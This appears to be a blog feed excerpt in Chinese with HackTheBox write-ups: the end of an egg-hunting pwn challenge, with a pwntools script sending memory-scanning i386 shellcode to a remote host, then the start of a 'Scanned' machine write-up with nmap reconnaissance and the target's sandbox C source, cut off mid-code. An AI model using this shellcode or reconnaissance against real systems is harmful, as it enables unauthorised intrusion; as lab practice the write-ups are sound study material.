edx 設為 0x5fffffff，然後我們將地址對齊到頁邊界，這樣才可以確保進到 test_next 之後我們可以在加一後進到下一頁的開頭，然後 <code>pusha</code> 保存所有暫存器的狀態，接著設定好暫存器呼叫 <code>syscall_access</code> 來確定該段記憶體是否可以訪問，檢查返回值是否表示記憶體無效，無效就看下一頁，如果有效就比對字串，不匹配就 test_next 檢查下一地址，找到的話就用 <code>sys_write</code> 輸出後續字串。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line"></span><br><span class="line">assembly = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">setup:</span></span><br><span class="line"><span class="string">    mov eax, 27</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    mov edi, 0x7b425448</span></span><br><span class="line"><span class="string">    mov edx, 0x5fffffff</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">next_page:</span></span><br><span class="line"><span class="string">    or dx, 0xfff</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">test_next:</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    pusha</span></span><br><span class="line"><span class="string">    xor ecx, ecx</span></span><br><span class="line"><span class="string">    mov al, 0x21</span></span><br><span class="line"><span class="string">    lea ebx, [edx + 0x4]</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    cmp al, 0xf2</span></span><br><span class="line"><span class="string">    popa</span></span><br><span class="line"><span class="string">    jz next_page</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push 0x04</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    push 0x01</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    mov ecx, edx</span></span><br><span class="line"><span class="string">    push 0x24</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = asm(assembly)</span><br><span class="line">r = remote(<span class="string">&quot;94.237.63.109&quot;</span>, <span class="number">52242</span>)</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://hackmd.io/@sal/rk1TiV8Hp" >https://hackmd.io/@sal/rk1TiV8Hp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned"></a>Pwned</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/egg_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Background-Knowledge&quot;&gt;&lt;a href=&quot;#Background-Knowledge&quot; class=&quot;headerlink&quot; title=&quot;Background Knowledge&quot;&gt;&lt;/a&gt;Background Knowledge&lt;/h2&gt;&lt;</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="egg-hunting" scheme="https://kazma.tw/tags/egg-hunting/"/>
    
    <category term="assembly" scheme="https://kazma.tw/tags/assembly/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Machines Scanned Writeup</title>
    <link href="https://kazma.tw/2024/11/15/HackTheBox-Machines-Scanned-Writeup/"/>
    <id>https://kazma.tw/2024/11/15/HackTheBox-Machines-Scanned-Writeup/</id>
    <published>2024-11-15T08:35:09.500Z</published>
    <updated>2024-11-15T12:37:28.869Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Scanned"><a href="#Scanned" class="headerlink" title="Scanned"></a>Scanned</h2><p>今天在神盾決賽前練習一些滲透測試，打算跟著官方 writeup 刷一些 insane 高分的機器。</p><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>首先我們先做 nmap，但這邊官方提供了一些參數設定讓掃描速度提升：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌─[sg-dedivip-1]─[10.10.14.22]─[kazma@htb-5fjpirbhiq]─[~]</span><br><span class="line">└──╼ [★]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.237.62 | grep ^[0-9] | <span class="built_in">cut</span> -d <span class="string">&#x27;/&#x27;</span> -f 1 | <span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27;,&#x27;</span> | sed s/,$//)</span><br><span class="line">┌─[sg-dedivip-1]─[10.10.14.22]─[kazma@htb-5fjpirbhiq]─[~]</span><br><span class="line">└──╼ [★]$ nmap -p<span class="variable">$ports</span> -sC -sV 10.129.237.62</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 02:56 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.237.62</span><br><span class="line">Host is up (0.0017s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 6a:7b:14:68:97:01:4a:08:6a:e1:37:b1:d2:bd:8f:3f (RSA)</span><br><span class="line">|   256 f6:b4:e1:10:f0:7b:38:48:66:34:c2:c6:28:ff:b8:25 (ECDSA)</span><br><span class="line">|_  256 c9:8b:96:19:51:e7:ce:1f:7d:3e:44:e9:a4:04:91:09 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0</span><br><span class="line">|_http-title: Malware Scanner</span><br><span class="line">|_http-server-header: nginx/1.18.0</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 6.77 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><ul><li>-p-: 掃描所有 65535 個 TCP 端口。</li><li>–min-rate&#x3D;1000: 確保掃描速率至少為 1000 個包&#x2F;秒，加快掃描。</li><li>-T4: 使用更積極的時間參數，降低掃描延遲，但仍保持穩定性。<br>第一部分是盡快速的全端口掃描然後格式化輸出為正確的 ports 參數格式例如：22,80,443，然後把結果賦值給變數 ports。<br>然後第二個指令再針對開放的端口進行以下檢查：</li><li>-sC: 使用 nmap 的內建腳本執行基本檢查（如默認憑證、常見漏洞、目標系統資訊）。</li><li>-sV: 探測服務的版本信息，方便確認具體軟件及其潛在漏洞。</li></ul><p>然後從掃描結果我們可以看到他有個網頁服務叫做 Malware Scanner，透過瀏覽器訪問我們可以看到首頁有他的服務使用說明，我們可以透過上傳我們不信任的執行檔上去，他會幫我們在一個安全的環境測試，他會幫我們列出他使用到的 syscalls 和 arguments，然後根據危險程度排列，另外我們還可以得知他是用 Debian 11 去執行的，其中有使用到 chroot, user namespaces, ptrace 等工具做檢測，最後他有附上他這個 scanner 的 source code。<br>解壓縮之後我們可以拿到兩個資料夾，malscanner 跟 sandbox，街著就來做 code review：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/capability.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_cap_header_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> version;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_cap_data_struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> effective;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> permitted;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> inheritable;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">copy</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* src, <span class="type">const</span> <span class="type">char</span>* dst)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">do_trace</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> jailsfd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DIE(err) fprintf(stderr, err <span class="string">&quot;: (%d)\n&quot;</span>, errno); exit(-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Take a 16 byte buffer and generate a pseudo-random UUID</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">generate_uuid</span><span class="params">(<span class="type">char</span>* buf)</span> &#123;</span><br><span class="line">    srand(time(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i+=<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(&amp;buf[i], <span class="string">&quot;%02hhx&quot;</span>, (<span class="type">char</span>)(rand() % <span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check we have all required capabilities</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_caps</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_cap_header_struct</span> <span class="title">header</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_cap_data_struct</span> <span class="title">caps</span>;</span></span><br><span class="line">    <span class="type">char</span> pad[<span class="number">32</span>];</span><br><span class="line">    header.version = _LINUX_CAPABILITY_VERSION_3;</span><br><span class="line">    header.pid = <span class="number">0</span>;</span><br><span class="line">    caps.effective = caps.inheritable = caps.permitted = <span class="number">0</span>;</span><br><span class="line">    syscall(SYS_capget, &amp;header, &amp;caps);</span><br><span class="line">    <span class="keyword">if</span> (!(caps.effective &amp; <span class="number">0x2401c0</span>)) &#123;</span><br><span class="line">        DIE(<span class="string">&quot;Insufficient capabilities&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_libs</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span>* libs[] = &#123;<span class="string">&quot;libc.so.6&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="type">char</span> path[FILENAME_MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> outpath[FILENAME_MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    system(<span class="string">&quot;mkdir -p bin usr/lib/x86_64-linux-gnu usr/lib64; cp /bin/sh bin&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; libs[i] != <span class="literal">NULL</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(path, <span class="string">&quot;/lib/x86_64-linux-gnu/%s&quot;</span>, libs[i]);</span><br><span class="line">        <span class="comment">// sprintf(path, &quot;/lib/%s&quot;, libs[i]);</span></span><br><span class="line">        <span class="built_in">sprintf</span>(outpath, <span class="string">&quot;./usr/lib/%s&quot;</span>, libs[i]);</span><br><span class="line">        copy(path, outpath);</span><br><span class="line">    &#125;</span><br><span class="line">    copy(<span class="string">&quot;/lib64/ld-linux-x86-64.so.2&quot;</span>, <span class="string">&quot;./usr/lib64/ld-linux-x86-64.so.2&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;ln -s usr/lib64 lib64; ln -s usr/lib lib; chmod 755 -R usr bin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create PID and network namespace</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_namespaces</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWPID|CLONE_NEWNET) != <span class="number">0</span>) &#123;DIE(<span class="string">&quot;Couldn&#x27;t make namespaces&quot;</span>);&#125;;</span><br><span class="line">    <span class="comment">// Create pid-1</span></span><br><span class="line">    <span class="keyword">if</span> (fork() != <span class="number">0</span>) &#123;sleep(<span class="number">6</span>); <span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    mkdir(<span class="string">&quot;./proc&quot;</span>, <span class="number">0555</span>);</span><br><span class="line">    mount(<span class="string">&quot;/proc&quot;</span>, <span class="string">&quot;./proc&quot;</span>, <span class="string">&quot;proc&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create our jail folder and move into it</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">make_jail</span><span class="params">(<span class="type">char</span>* name, <span class="type">char</span>* program)</span> &#123;</span><br><span class="line">    jailsfd = open(<span class="string">&quot;jails&quot;</span>, O_RDONLY|__O_DIRECTORY);</span><br><span class="line">    <span class="keyword">if</span> (faccessat(jailsfd, name, F_OK, <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        DIE(<span class="string">&quot;Jail name exists&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> result = mkdirat(jailsfd, name, <span class="number">0771</span>);</span><br><span class="line">    <span class="keyword">if</span> (result == <span class="number">-1</span> &amp;&amp; errno != EEXIST) &#123;</span><br><span class="line">        DIE( <span class="string">&quot;Could not create the jail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (access(program, F_OK) != <span class="number">0</span>) &#123;</span><br><span class="line">        DIE(<span class="string">&quot;Program does not exist&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    chdir(<span class="string">&quot;jails&quot;</span>);</span><br><span class="line">    chdir(name);</span><br><span class="line">    copy_libs();</span><br><span class="line">    do_namespaces();</span><br><span class="line">    copy(program, <span class="string">&quot;./userprog&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (chroot(<span class="string">&quot;.&quot;</span>)) &#123;DIE(<span class="string">&quot;Couldn&#x27;t chroot #1&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">if</span> (setgid(<span class="number">1001</span>)) &#123;DIE(<span class="string">&quot;SGID&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">if</span> (setegid(<span class="number">1001</span>)) &#123;DIE(<span class="string">&quot;SEGID&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">if</span> (setuid(<span class="number">1001</span>)) &#123;DIE(<span class="string">&quot;SUID&quot;</span>);&#125;;</span><br><span class="line">    <span class="keyword">if</span> (seteuid(<span class="number">1001</span>)) &#123;DIE(<span class="string">&quot;SEUID&quot;</span>);&#125;;</span><br><span class="line">    do_trace();</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;program&gt; [uuid]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) &gt; FILENAME_MAX - <span class="number">50</span>) &#123;</span><br><span class="line">        DIE(<span class="string">&quot;Program name too long&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((argv[<span class="number">1</span>][<span class="number">0</span>]) != <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">        DIE(<span class="string">&quot;Program path must be absolute&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    umask(<span class="number">0</span>);</span><br><span class="line">    check_caps();</span><br><span class="line">    <span class="type">int</span> result = mkdir(<span class="string">&quot;jails&quot;</span>, <span class="number">0771</span>);</span><br><span class="line">    <span class="keyword">if</span> (result == <span class="number">-1</span> &amp;&amp; errno != EEXIST) &#123;</span><br><span class="line">        DIE( <span class="string">&quot;Could not create jail directory&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> uuid[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        generate_uuid(uuid);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(uuid, argv[<span class="number">2</span>], <span class="number">32</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    uuid[<span class="number">32</span>] = <span class="number">0</span>;</span><br><span class="line">    make_jail(uuid, argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>我們可以透過作者貼心的註解快速了解裡面的功能：</p><ul><li>會檢查執行檔的特權是否有開 CAP_SYS_ADMIN|CAP_SYS_CHROOT|CAP_SETUID|CAP_SETGID|CAP_SETPCAP</li><li>然後創建 <code>jails</code> 這個資料夾，然後在底下創建一個子目錄名稱為上傳檔案的 md5，可以從 <code>malscanner/scanner/views.py</code> 得知。</li><li>使用 setegid(1001)、setuid(1001) 和 seteuid(1001)，將執行程序的進程權限降級到非特權用戶（ID 為 1001）。</li><li>然後會檢查以下的項目<ul><li>必須提供要執行的程序路徑（絕對路徑）。</li><li>檢查程序名稱是否過長，並生成或使用 UUID 來標識該執行過程。</li><li>確保工作目錄存在，否則報錯並退出。</li></ul></li><li>沙箱中的運行程序<ul><li>會創建新的 PID 和網路命名空間。</li><li>將新的 &#x2F;proc 文件掛載到沙箱目錄中。</li><li>然後將用戶上傳的程序複製到沙箱內的 &#x2F;userprog。</li><li>移除所有進程的 capabilities，進一步降低權限。</li></ul></li><li>執行用戶程序並記錄系統調用，會 fork 成三個進程<ul><li>子進程：執行上傳的程序</li><li>殺手進程（killer）：在 5 秒後終止子進程</li><li>紀錄進程（logger）：記錄子進程的系統調用，便於之後分析。<br>接著我們看 tracing.c：<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/capability.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 